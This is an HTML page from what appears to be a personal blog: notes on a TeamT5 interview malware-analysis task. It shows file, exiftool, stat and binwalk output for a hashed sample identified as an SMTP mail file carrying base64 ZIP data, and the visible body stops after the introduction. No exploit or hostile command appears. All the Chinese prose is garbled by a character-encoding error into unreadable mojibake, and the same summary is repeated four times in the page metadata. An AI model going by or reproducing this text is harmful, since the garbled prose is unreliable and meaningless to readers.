<!doctype html><html lang=en-us dir=ltr itemscope itemtype=http://schema.org/Article data-r-output-format=html><head><meta charset=utf-8><meta name=viewport content="height=device-height,width=device-width,initial-scale=1,minimum-scale=1"><meta name=generator content="Hugo 0.145.0"><meta name=generator content="Relearn 7.6.0+b932d301d7838f3c1a50e318e216b55ce5cc9148"><meta name=description content="TeamT5ç­†è©¦é¡Œç›®ç­†è¨˜ :::info å‰è¨€: é€šå¸¸æˆ‘è‡ªå·±æ‹¿åˆ°ä¸€éš»æ¨£æœ¬ï¼Œèµ·æ‰‹å¼æœƒå…ˆæœä¸€ä¸‹hashï¼ŒVirusTotalå¦‚æœæœ‰ç´€éŒ„çš„è©±æœ€å¥½ï¼Œå†ä¾†æœƒä¸Ÿåˆ°AnyRunçœ‹ä¸€ä¸‹å‹•æ…‹sandboxçš„ç‹€æ…‹ç‚ºä½•ï¼Œä½†ä¸ç¢ºå®šé€™æ¨£çš„æ“ä½œæ˜¯å¦ç¬¦åˆæœ¬æ¬¡ç­†è©¦çš„é æœŸï¼Œæ‰€ä»¥æˆ‘æœƒå…ˆè¨­æ³•åœ¨æœ¬æ©ŸVMå…§åˆ†æçœ‹çœ‹ï¼Œå¦‚æœæœ‰åˆ©ç”¨é€™å¹¾å€‹online toolsè€Œå¾—çŸ¥çš„è³‡è¨Šï¼Œæœƒå†è¡Œæ¨™è¨» ::: :::danger ç¶“éäºŒéšé¢è©¦å¾Œï¼Œç”¨ç·šä¸Šçš„å·¥å…·ä¾‹å¦‚VirusTotalå’ŒAnyRunéƒ½æ˜¯è¢«åš´æ ¼ç¦æ­¢çš„ã€‚ ç¬¬ä¸€å€‹æ¨£æœ¬ç¸½èŠ±è²»æ™‚é–“: 2å¤©/ç¬¬äºŒå€‹æ¨£æœ¬ç¸½èŠ±è²»æ™‚é–“: 4å¤© :::
æ¨£æœ¬(93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a) æƒ¡æ„ç¨‹å¼ æª”æ¡ˆè³‡è¨Š DIE(Detect It Easy) çœ‹èµ·ä¾†æ˜¯ä¸€å€‹HTMLçš„ç´”æ–‡å­—æª”æ¡ˆ
File/Stat/Exiftool å¾ä»¥ä¸‹çµæœä¾†çœ‹ï¼Œæ˜¯ä¸€å€‹SMTPçš„éƒµä»¶æª”æ¡ˆï¼Œä¸¦ä¸”æ˜¯ç´”æ–‡å­—çš„å½¢å¼ï¼Œæ‰€ä»¥ç›´è¦ºä¸Šå¯èƒ½å’ŒOutlookæˆ–æ˜¯Firefox Thunderbirdæœ‰é—œä¿‚ï¼Œä»¥binwalkçš„çµæœä¾†èªªï¼Œä»–æ‡‰è©²æœ‰å£“ç¸®ä¸€äº›å…§å®¹åœ¨å…¶ä¸­ï¼Œå¦‚æœå¯¦éš›ä¸Ÿåˆ°Any.Runçš„è©±æœƒç™¼ç¾çš„ç¢ºæœ‰å¾ˆå¤šæª”æ¡ˆè¢«compressed æˆ–è€…æ˜¯èªªï¼Œå¾æª”æ¡ˆå…§å®¹ä¾†çœ‹(HxD)ï¼Œæœƒç™¼ç¾dataå¸¶äº†ä¸€å€‹base64çš„fileï¼Œdecodeæœƒç™¼ç¾æ˜¯0x50 4B 03 04 :::spoiler Command Result
$ file 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a: SMTP mail, ASCII text, with CRLF line terminators $ exiftool 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a ExifTool Version Number : 12.40 File Name : 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a Directory : . File Size : 180 KiB File Modification Date/Time : 2023:08:14 11:54:39+08:00 File Access Date/Time : 2024:02:29 16:55:48+08:00 File Inode Change Date/Time : 2024:02:29 16:55:48+08:00 File Permissions : -rwxrwxrwx File Type : TXT File Type Extension : txt MIME Type : text/plain MIME Encoding : us-ascii Newlines : Windows CRLF Line Count : 2410 Word Count : 2741 $ stat 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a File: 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a Size: 184712 Blocks: 368 IO Block: 4096 regular file Device: 66h/102d Inode: 1688849860790082 Links: 1 Access: (0777/-rwxrwxrwx) Uid: ( 1000/ sbk6401) Gid: ( 1000/ sbk6401) Access: 2024-02-29 16:55:48.949690200 +0800 Modify: 2023-08-14 11:54:39.000000000 +0800 Change: 2024-02-29 16:55:48.949690200 +0800 Birth: - $ binwalk 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 4244 0x1094 HTML document header 5554 0x15B2 HTML document footer 73264 0x11E30 StuffIt Deluxe Segment (data): fWm1 169908 0x297B4 IMG0 (VxWorks) header, size: 218780743 :::"><meta name=author content><meta name=twitter:card content="summary"><meta name=twitter:title content="TeamT5ç­†è©¦é¡Œç›®ç­†è¨˜ :: SBK Hugo Site"><meta name=twitter:description content="TeamT5ç­†è©¦é¡Œç›®ç­†è¨˜ :::info å‰è¨€: é€šå¸¸æˆ‘è‡ªå·±æ‹¿åˆ°ä¸€éš»æ¨£æœ¬ï¼Œèµ·æ‰‹å¼æœƒå…ˆæœä¸€ä¸‹hashï¼ŒVirusTotalå¦‚æœæœ‰ç´€éŒ„çš„è©±æœ€å¥½ï¼Œå†ä¾†æœƒä¸Ÿåˆ°AnyRunçœ‹ä¸€ä¸‹å‹•æ…‹sandboxçš„ç‹€æ…‹ç‚ºä½•ï¼Œä½†ä¸ç¢ºå®šé€™æ¨£çš„æ“ä½œæ˜¯å¦ç¬¦åˆæœ¬æ¬¡ç­†è©¦çš„é æœŸï¼Œæ‰€ä»¥æˆ‘æœƒå…ˆè¨­æ³•åœ¨æœ¬æ©ŸVMå…§åˆ†æçœ‹çœ‹ï¼Œå¦‚æœæœ‰åˆ©ç”¨é€™å¹¾å€‹online toolsè€Œå¾—çŸ¥çš„è³‡è¨Šï¼Œæœƒå†è¡Œæ¨™è¨» ::: :::danger ç¶“éäºŒéšé¢è©¦å¾Œï¼Œç”¨ç·šä¸Šçš„å·¥å…·ä¾‹å¦‚VirusTotalå’ŒAnyRunéƒ½æ˜¯è¢«åš´æ ¼ç¦æ­¢çš„ã€‚ ç¬¬ä¸€å€‹æ¨£æœ¬ç¸½èŠ±è²»æ™‚é–“: 2å¤©/ç¬¬äºŒå€‹æ¨£æœ¬ç¸½èŠ±è²»æ™‚é–“: 4å¤© :::
æ¨£æœ¬(93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a) æƒ¡æ„ç¨‹å¼ æª”æ¡ˆè³‡è¨Š DIE(Detect It Easy) çœ‹èµ·ä¾†æ˜¯ä¸€å€‹HTMLçš„ç´”æ–‡å­—æª”æ¡ˆ
File/Stat/Exiftool å¾ä»¥ä¸‹çµæœä¾†çœ‹ï¼Œæ˜¯ä¸€å€‹SMTPçš„éƒµä»¶æª”æ¡ˆï¼Œä¸¦ä¸”æ˜¯ç´”æ–‡å­—çš„å½¢å¼ï¼Œæ‰€ä»¥ç›´è¦ºä¸Šå¯èƒ½å’ŒOutlookæˆ–æ˜¯Firefox Thunderbirdæœ‰é—œä¿‚ï¼Œä»¥binwalkçš„çµæœä¾†èªªï¼Œä»–æ‡‰è©²æœ‰å£“ç¸®ä¸€äº›å…§å®¹åœ¨å…¶ä¸­ï¼Œå¦‚æœå¯¦éš›ä¸Ÿåˆ°Any.Runçš„è©±æœƒç™¼ç¾çš„ç¢ºæœ‰å¾ˆå¤šæª”æ¡ˆè¢«compressed æˆ–è€…æ˜¯èªªï¼Œå¾æª”æ¡ˆå…§å®¹ä¾†çœ‹(HxD)ï¼Œæœƒç™¼ç¾dataå¸¶äº†ä¸€å€‹base64çš„fileï¼Œdecodeæœƒç™¼ç¾æ˜¯0x50 4B 03 04 :::spoiler Command Result
$ file 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a: SMTP mail, ASCII text, with CRLF line terminators $ exiftool 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a ExifTool Version Number : 12.40 File Name : 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a Directory : . File Size : 180 KiB File Modification Date/Time : 2023:08:14 11:54:39+08:00 File Access Date/Time : 2024:02:29 16:55:48+08:00 File Inode Change Date/Time : 2024:02:29 16:55:48+08:00 File Permissions : -rwxrwxrwx File Type : TXT File Type Extension : txt MIME Type : text/plain MIME Encoding : us-ascii Newlines : Windows CRLF Line Count : 2410 Word Count : 2741 $ stat 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a File: 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a Size: 184712 Blocks: 368 IO Block: 4096 regular file Device: 66h/102d Inode: 1688849860790082 Links: 1 Access: (0777/-rwxrwxrwx) Uid: ( 1000/ sbk6401) Gid: ( 1000/ sbk6401) Access: 2024-02-29 16:55:48.949690200 +0800 Modify: 2023-08-14 11:54:39.000000000 +0800 Change: 2024-02-29 16:55:48.949690200 +0800 Birth: - $ binwalk 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 4244 0x1094 HTML document header 5554 0x15B2 HTML document footer 73264 0x11E30 StuffIt Deluxe Segment (data): fWm1 169908 0x297B4 IMG0 (VxWorks) header, size: 218780743 :::"><meta property="og:url" content="https://bernie6401.github.io/job/interview/teamt5%E7%AD%86%E8%A9%A6%E9%A1%8C%E7%9B%AE%E7%AD%86%E8%A8%98/index.html"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="TeamT5ç­†è©¦é¡Œç›®ç­†è¨˜ :: SBK Hugo Site"><meta property="og:description" content="TeamT5ç­†è©¦é¡Œç›®ç­†è¨˜ :::info å‰è¨€: é€šå¸¸æˆ‘è‡ªå·±æ‹¿åˆ°ä¸€éš»æ¨£æœ¬ï¼Œèµ·æ‰‹å¼æœƒå…ˆæœä¸€ä¸‹hashï¼ŒVirusTotalå¦‚æœæœ‰ç´€éŒ„çš„è©±æœ€å¥½ï¼Œå†ä¾†æœƒä¸Ÿåˆ°AnyRunçœ‹ä¸€ä¸‹å‹•æ…‹sandboxçš„ç‹€æ…‹ç‚ºä½•ï¼Œä½†ä¸ç¢ºå®šé€™æ¨£çš„æ“ä½œæ˜¯å¦ç¬¦åˆæœ¬æ¬¡ç­†è©¦çš„é æœŸï¼Œæ‰€ä»¥æˆ‘æœƒå…ˆè¨­æ³•åœ¨æœ¬æ©ŸVMå…§åˆ†æçœ‹çœ‹ï¼Œå¦‚æœæœ‰åˆ©ç”¨é€™å¹¾å€‹online toolsè€Œå¾—çŸ¥çš„è³‡è¨Šï¼Œæœƒå†è¡Œæ¨™è¨» ::: :::danger ç¶“éäºŒéšé¢è©¦å¾Œï¼Œç”¨ç·šä¸Šçš„å·¥å…·ä¾‹å¦‚VirusTotalå’ŒAnyRunéƒ½æ˜¯è¢«åš´æ ¼ç¦æ­¢çš„ã€‚ ç¬¬ä¸€å€‹æ¨£æœ¬ç¸½èŠ±è²»æ™‚é–“: 2å¤©/ç¬¬äºŒå€‹æ¨£æœ¬ç¸½èŠ±è²»æ™‚é–“: 4å¤© :::
æ¨£æœ¬(93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a) æƒ¡æ„ç¨‹å¼ æª”æ¡ˆè³‡è¨Š DIE(Detect It Easy) çœ‹èµ·ä¾†æ˜¯ä¸€å€‹HTMLçš„ç´”æ–‡å­—æª”æ¡ˆ
File/Stat/Exiftool å¾ä»¥ä¸‹çµæœä¾†çœ‹ï¼Œæ˜¯ä¸€å€‹SMTPçš„éƒµä»¶æª”æ¡ˆï¼Œä¸¦ä¸”æ˜¯ç´”æ–‡å­—çš„å½¢å¼ï¼Œæ‰€ä»¥ç›´è¦ºä¸Šå¯èƒ½å’ŒOutlookæˆ–æ˜¯Firefox Thunderbirdæœ‰é—œä¿‚ï¼Œä»¥binwalkçš„çµæœä¾†èªªï¼Œä»–æ‡‰è©²æœ‰å£“ç¸®ä¸€äº›å…§å®¹åœ¨å…¶ä¸­ï¼Œå¦‚æœå¯¦éš›ä¸Ÿåˆ°Any.Runçš„è©±æœƒç™¼ç¾çš„ç¢ºæœ‰å¾ˆå¤šæª”æ¡ˆè¢«compressed æˆ–è€…æ˜¯èªªï¼Œå¾æª”æ¡ˆå…§å®¹ä¾†çœ‹(HxD)ï¼Œæœƒç™¼ç¾dataå¸¶äº†ä¸€å€‹base64çš„fileï¼Œdecodeæœƒç™¼ç¾æ˜¯0x50 4B 03 04 :::spoiler Command Result
$ file 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a: SMTP mail, ASCII text, with CRLF line terminators $ exiftool 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a ExifTool Version Number : 12.40 File Name : 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a Directory : . File Size : 180 KiB File Modification Date/Time : 2023:08:14 11:54:39+08:00 File Access Date/Time : 2024:02:29 16:55:48+08:00 File Inode Change Date/Time : 2024:02:29 16:55:48+08:00 File Permissions : -rwxrwxrwx File Type : TXT File Type Extension : txt MIME Type : text/plain MIME Encoding : us-ascii Newlines : Windows CRLF Line Count : 2410 Word Count : 2741 $ stat 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a File: 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a Size: 184712 Blocks: 368 IO Block: 4096 regular file Device: 66h/102d Inode: 1688849860790082 Links: 1 Access: (0777/-rwxrwxrwx) Uid: ( 1000/ sbk6401) Gid: ( 1000/ sbk6401) Access: 2024-02-29 16:55:48.949690200 +0800 Modify: 2023-08-14 11:54:39.000000000 +0800 Change: 2024-02-29 16:55:48.949690200 +0800 Birth: - $ binwalk 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 4244 0x1094 HTML document header 5554 0x15B2 HTML document footer 73264 0x11E30 StuffIt Deluxe Segment (data): fWm1 169908 0x297B4 IMG0 (VxWorks) header, size: 218780743 :::"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="Jobs"><meta property="article:tag" content="Interview"><meta itemprop=name content="TeamT5ç­†è©¦é¡Œç›®ç­†è¨˜ :: SBK Hugo Site"><meta itemprop=description content="TeamT5ç­†è©¦é¡Œç›®ç­†è¨˜ :::info å‰è¨€: é€šå¸¸æˆ‘è‡ªå·±æ‹¿åˆ°ä¸€éš»æ¨£æœ¬ï¼Œèµ·æ‰‹å¼æœƒå…ˆæœä¸€ä¸‹hashï¼ŒVirusTotalå¦‚æœæœ‰ç´€éŒ„çš„è©±æœ€å¥½ï¼Œå†ä¾†æœƒä¸Ÿåˆ°AnyRunçœ‹ä¸€ä¸‹å‹•æ…‹sandboxçš„ç‹€æ…‹ç‚ºä½•ï¼Œä½†ä¸ç¢ºå®šé€™æ¨£çš„æ“ä½œæ˜¯å¦ç¬¦åˆæœ¬æ¬¡ç­†è©¦çš„é æœŸï¼Œæ‰€ä»¥æˆ‘æœƒå…ˆè¨­æ³•åœ¨æœ¬æ©ŸVMå…§åˆ†æçœ‹çœ‹ï¼Œå¦‚æœæœ‰åˆ©ç”¨é€™å¹¾å€‹online toolsè€Œå¾—çŸ¥çš„è³‡è¨Šï¼Œæœƒå†è¡Œæ¨™è¨» ::: :::danger ç¶“éäºŒéšé¢è©¦å¾Œï¼Œç”¨ç·šä¸Šçš„å·¥å…·ä¾‹å¦‚VirusTotalå’ŒAnyRunéƒ½æ˜¯è¢«åš´æ ¼ç¦æ­¢çš„ã€‚ ç¬¬ä¸€å€‹æ¨£æœ¬ç¸½èŠ±è²»æ™‚é–“: 2å¤©/ç¬¬äºŒå€‹æ¨£æœ¬ç¸½èŠ±è²»æ™‚é–“: 4å¤© :::
æ¨£æœ¬(93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a) æƒ¡æ„ç¨‹å¼ æª”æ¡ˆè³‡è¨Š DIE(Detect It Easy) çœ‹èµ·ä¾†æ˜¯ä¸€å€‹HTMLçš„ç´”æ–‡å­—æª”æ¡ˆ
File/Stat/Exiftool å¾ä»¥ä¸‹çµæœä¾†çœ‹ï¼Œæ˜¯ä¸€å€‹SMTPçš„éƒµä»¶æª”æ¡ˆï¼Œä¸¦ä¸”æ˜¯ç´”æ–‡å­—çš„å½¢å¼ï¼Œæ‰€ä»¥ç›´è¦ºä¸Šå¯èƒ½å’ŒOutlookæˆ–æ˜¯Firefox Thunderbirdæœ‰é—œä¿‚ï¼Œä»¥binwalkçš„çµæœä¾†èªªï¼Œä»–æ‡‰è©²æœ‰å£“ç¸®ä¸€äº›å…§å®¹åœ¨å…¶ä¸­ï¼Œå¦‚æœå¯¦éš›ä¸Ÿåˆ°Any.Runçš„è©±æœƒç™¼ç¾çš„ç¢ºæœ‰å¾ˆå¤šæª”æ¡ˆè¢«compressed æˆ–è€…æ˜¯èªªï¼Œå¾æª”æ¡ˆå…§å®¹ä¾†çœ‹(HxD)ï¼Œæœƒç™¼ç¾dataå¸¶äº†ä¸€å€‹base64çš„fileï¼Œdecodeæœƒç™¼ç¾æ˜¯0x50 4B 03 04 :::spoiler Command Result
$ file 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a: SMTP mail, ASCII text, with CRLF line terminators $ exiftool 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a ExifTool Version Number : 12.40 File Name : 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a Directory : . File Size : 180 KiB File Modification Date/Time : 2023:08:14 11:54:39+08:00 File Access Date/Time : 2024:02:29 16:55:48+08:00 File Inode Change Date/Time : 2024:02:29 16:55:48+08:00 File Permissions : -rwxrwxrwx File Type : TXT File Type Extension : txt MIME Type : text/plain MIME Encoding : us-ascii Newlines : Windows CRLF Line Count : 2410 Word Count : 2741 $ stat 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a File: 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a Size: 184712 Blocks: 368 IO Block: 4096 regular file Device: 66h/102d Inode: 1688849860790082 Links: 1 Access: (0777/-rwxrwxrwx) Uid: ( 1000/ sbk6401) Gid: ( 1000/ sbk6401) Access: 2024-02-29 16:55:48.949690200 +0800 Modify: 2023-08-14 11:54:39.000000000 +0800 Change: 2024-02-29 16:55:48.949690200 +0800 Birth: - $ binwalk 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 4244 0x1094 HTML document header 5554 0x15B2 HTML document footer 73264 0x11E30 StuffIt Deluxe Segment (data): fWm1 169908 0x297B4 IMG0 (VxWorks) header, size: 218780743 :::"><meta itemprop=wordCount content="2436"><meta itemprop=keywords content="Interview"><title>TeamT5ç­†è©¦é¡Œç›®ç­†è¨˜ :: SBK Hugo Site</title>
<link href=/fonts/fontawesome/css/fontawesome-all.min.css?1743619851 rel=stylesheet media=print onload='this.media="all",this.onload=null'><noscript><link href=/fonts/fontawesome/css/fontawesome-all.min.css?1743619851 rel=stylesheet></noscript><link href=/css/perfect-scrollbar/perfect-scrollbar.min.css?1743619851 rel=stylesheet><link href=/css/theme.min.css?1743619851 rel=stylesheet><link href=/css/format-html.min.css?1743619851 rel=stylesheet id=R-format-style><link href=/css/auto-complete/auto-complete.min.css?1743619851 rel=stylesheet><script src=/js/auto-complete/auto-complete.min.js?1743619851 defer></script><script src=/js/lunr/lunr.min.js?1743619851 defer></script><script src=/js/lunr/lunr.stemmer.support.min.js?1743619851 defer></script><script src=/js/lunr/lunr.multi.min.js?1743619851 defer></script><script src=/js/lunr/lunr.en.min.js?1743619851 defer></script><script src=/js/search.min.js?1743619851 defer></script><script>window.relearn=window.relearn||{},window.relearn.min=`.min`,window.relearn.path="/job/interview/teamt5%E7%AD%86%E8%A9%A6%E9%A1%8C%E7%9B%AE%E7%AD%86%E8%A8%98/index.html",window.relearn.relBasePath="../../..",window.relearn.relBaseUri="../../..",window.relearn.absBaseUri="https://bernie6401.github.io",window.relearn.contentLangs=["en"],window.relearn.index_js_url="/searchindex.en.js?1743619851",window.relearn.disableAnchorCopy=!1,window.relearn.disableAnchorScrolling=!1,window.relearn.disableInlineCopyToClipboard=!1,window.relearn.enableBlockCodeWrap=!0,window.relearn.getItem=(e,t)=>e.getItem(t),window.relearn.setItem=(e,t,n)=>e.setItem(t,n),window.relearn.removeItem=(e,t)=>e.removeItem(t),window.relearn.themevariants=["auto"],window.relearn.customvariantname="my-custom-variant",window.relearn.changeVariant=function(e){var t=document.documentElement.dataset.rThemeVariant;window.relearn.setItem(window.localStorage,window.relearn.absBaseUri+"/variant",e),document.documentElement.dataset.rThemeVariant=e,t!=e&&(document.dispatchEvent(new CustomEvent("themeVariantLoaded",{detail:{variant:e,oldVariant:t}})),window.relearn.markVariant())},window.relearn.markVariant=function(){var e=window.relearn.getItem(window.localStorage,window.relearn.absBaseUri+"/variant");document.querySelectorAll(".R-variantswitcher select").forEach(t=>{t.value=e})},window.relearn.initVariant=function(){var e=window.relearn.getItem(window.localStorage,window.relearn.absBaseUri+"/variant")??"";e==window.relearn.customvariantname||(!e||!window.relearn.themevariants.includes(e))&&(e=window.relearn.themevariants[0],window.relearn.setItem(window.localStorage,window.relearn.absBaseUri+"/variant",e)),document.documentElement.dataset.rThemeVariant=e},window.relearn.initVariant(),window.relearn.markVariant(),window.T_Copy_to_clipboard=`Copy to clipboard`,window.T_Copied_to_clipboard=`Copied to clipboard!`,window.T_Copy_link_to_clipboard=`Copy link to clipboard`,window.T_Link_copied_to_clipboard=`Copied link to clipboard!`,window.T_Reset_view=`Reset view`,window.T_View_reset=`View reset!`,window.T_No_results_found=`No results found for "{0}"`,window.T_N_results_found=`{1} results found for "{0}"`</script></head><body class="mobile-support html" data-url=/job/interview/teamt5%E7%AD%86%E8%A9%A6%E9%A1%8C%E7%9B%AE%E7%AD%86%E8%A8%98/index.html><div id=R-body class=default-animation><div id=R-body-overlay></div><nav id=R-topbar><div class=topbar-wrapper><div class=topbar-sidebar-divider></div><div class="topbar-area topbar-area-start" data-area=start><div class="topbar-button topbar-button-sidebar" data-content-empty=disable data-width-s=show data-width-m=hide data-width-l=hide><button class=topbar-control onclick=toggleNav() type=button title="Menu (CTRL+ALT+n)"><i class="fa-fw fas fa-bars"></i></button></div><div class="topbar-button topbar-button-toc" data-content-empty=hide data-width-s=show data-width-m=show data-width-l=show><button class=topbar-control onclick=toggleTopbarFlyout(this) type=button title="Table of Contents (CTRL+ALT+t)"><i class="fa-fw fas fa-list-alt"></i></button><div class=topbar-content><div class=topbar-content-wrapper><nav class=TableOfContents><ul><li><a href=#æƒ¡æ„ç¨‹å¼>æƒ¡æ„ç¨‹å¼</a><ul><li><a href=#æª”æ¡ˆè³‡è¨Š>æª”æ¡ˆè³‡è¨Š</a></li><li><a href=#åŸ·è¡Œæµç¨‹>åŸ·è¡Œæµç¨‹</a></li><li><a href=#é€šè¨Šå”å®š>é€šè¨Šå”å®š</a></li><li><a href=#åŠ è§£å¯†æ¼”ç®—æ³•>åŠ è§£å¯†æ¼”ç®—æ³•</a></li><li><a href=#å¾Œé–€åŠŸèƒ½>å¾Œé–€åŠŸèƒ½</a></li><li><a href=#å¸¸é§æ–¹å¼>å¸¸é§æ–¹å¼</a></li></ul></li><li><a href=#ä¸­ç¹¼ç«™>ä¸­ç¹¼ç«™</a><ul><li><a href=#åŸºæœ¬è³‡è¨Š>åŸºæœ¬è³‡è¨Š</a></li><li><a href=#é—œé€£è³‡è¨Š>é—œé€£è³‡è¨Š</a></li></ul></li><li><a href=#å¨è„…æƒ…è³‡>å¨è„…æƒ…è³‡</a><ul><li><a href=#æ”»æ“Šè€…>æ”»æ“Šè€…</a></li><li><a href=#æ”»æ“Šæ™‚é–“>æ”»æ“Šæ™‚é–“</a></li><li><a href=#å—å®³è€…>å—å®³è€…</a></li></ul></li></ul><ul><li><a href=#æƒ¡æ„ç¨‹å¼-1>æƒ¡æ„ç¨‹å¼</a><ul><li><a href=#æª”æ¡ˆè³‡è¨Š-1>æª”æ¡ˆè³‡è¨Š</a></li><li><a href=#åŸ·è¡Œæµç¨‹-1>åŸ·è¡Œæµç¨‹</a></li><li><a href=#é€šè¨Šå”å®š-1>é€šè¨Šå”å®š</a></li><li><a href=#åŠ è§£å¯†æ¼”ç®—æ³•-1>åŠ è§£å¯†æ¼”ç®—æ³•</a></li><li><a href=#å¾Œé–€åŠŸèƒ½-1>å¾Œé–€åŠŸèƒ½</a></li><li><a href=#å¸¸é§æ–¹å¼-1>å¸¸é§æ–¹å¼</a></li></ul></li><li><a href=#ä¸­ç¹¼ç«™-1>ä¸­ç¹¼ç«™</a><ul><li><a href=#åŸºæœ¬è³‡è¨Š-1>åŸºæœ¬è³‡è¨Š</a></li><li><a href=#é—œé€£è³‡è¨Š-1>é—œé€£è³‡è¨Š</a></li></ul></li><li><a href=#å¨è„…æƒ…è³‡-1>å¨è„…æƒ…è³‡</a><ul><li><a href=#æ”»æ“Šè€…-1>æ”»æ“Šè€…</a></li><li><a href=#æ”»æ“Šæ™‚é–“-1>æ”»æ“Šæ™‚é–“</a></li><li><a href=#å—å®³è€…-1>å—å®³è€…</a></li></ul></li></ul></nav></div></div></div></div><ol class="topbar-breadcrumbs breadcrumbs highlightable" itemscope itemtype=http://schema.org/BreadcrumbList><li itemscope itemtype=https://schema.org/ListItem itemprop=itemListElement><a itemprop=item href=/index.html><span itemprop=name>SBK Hugo Site</span></a><meta itemprop=position content="1">&nbsp;>&nbsp;</li><li itemscope itemtype=https://schema.org/ListItem itemprop=itemListElement><a itemprop=item href=/job/index.html><span itemprop=name>Jobs</span></a><meta itemprop=position content="2">&nbsp;>&nbsp;</li><li itemscope itemtype=https://schema.org/ListItem itemprop=itemListElement><span itemprop=name>TeamT5ç­†è©¦é¡Œç›®ç­†è¨˜</span><meta itemprop=position content="3"></li></ol><div class="topbar-area topbar-area-end" data-area=end><div class="topbar-button topbar-button-prev" data-content-empty=disable data-width-s=show data-width-m=show data-width-l=show><a class=topbar-control href=/job/index.html title="Jobs (ğŸ¡)"><i class="fa-fw fas fa-chevron-left"></i></a></div><div class="topbar-button topbar-button-next" data-content-empty=disable data-width-s=show data-width-m=show data-width-l=show><a class=topbar-control href=/job/interview/trapa-interview/index.html title="Trapa Interview (ğŸ¡’)"><i class="fa-fw fas fa-chevron-right"></i></a></div><div class="topbar-button topbar-button-more" data-content-empty=hide data-width-s=show data-width-m=show data-width-l=show><button class=topbar-control onclick=toggleTopbarFlyout(this) type=button title=More><i class="fa-fw fas fa-ellipsis-v"></i></button><div class=topbar-content><div class=topbar-content-wrapper><div class="topbar-area topbar-area-more" data-area=more></div></div></div></div></div></div></nav><div id=R-main-overlay></div><main id=R-body-inner class="highlightable job" tabindex=-1><div class=flex-block-wrapper><article class=default><header class=headline><div class="R-taxonomy taxonomy-tags cstyle tags" title=Tags style=--VARIABLE-TAGS-BG-color:var(--INTERNAL-TAG-BG-color)><ul><li><a class=term-link href=/tags/interview/index.html>Interview</a></li></ul></div></header><h1 id=teamt5ç­†è©¦é¡Œç›®ç­†è¨˜>TeamT5ç­†è©¦é¡Œç›®ç­†è¨˜</h1><h1 id=teamt5ç­†è©¦é¡Œç›®ç­†è¨˜>TeamT5ç­†è©¦é¡Œç›®ç­†è¨˜</h1><p>:::info
å‰è¨€: é€šå¸¸æˆ‘è‡ªå·±æ‹¿åˆ°ä¸€éš»æ¨£æœ¬ï¼Œèµ·æ‰‹å¼æœƒå…ˆæœä¸€ä¸‹hashï¼ŒVirusTotalå¦‚æœæœ‰ç´€éŒ„çš„è©±æœ€å¥½ï¼Œå†ä¾†æœƒä¸Ÿåˆ°AnyRunçœ‹ä¸€ä¸‹å‹•æ…‹sandboxçš„ç‹€æ…‹ç‚ºä½•ï¼Œä½†ä¸ç¢ºå®šé€™æ¨£çš„æ“ä½œæ˜¯å¦ç¬¦åˆæœ¬æ¬¡ç­†è©¦çš„é æœŸï¼Œæ‰€ä»¥æˆ‘æœƒå…ˆè¨­æ³•åœ¨æœ¬æ©ŸVMå…§åˆ†æçœ‹çœ‹ï¼Œå¦‚æœæœ‰åˆ©ç”¨é€™å¹¾å€‹online toolsè€Œå¾—çŸ¥çš„è³‡è¨Šï¼Œæœƒå†è¡Œæ¨™è¨»
:::
:::danger
ç¶“éäºŒéšé¢è©¦å¾Œï¼Œç”¨ç·šä¸Šçš„å·¥å…·ä¾‹å¦‚VirusTotalå’ŒAnyRunéƒ½æ˜¯è¢«åš´æ ¼ç¦æ­¢çš„ã€‚
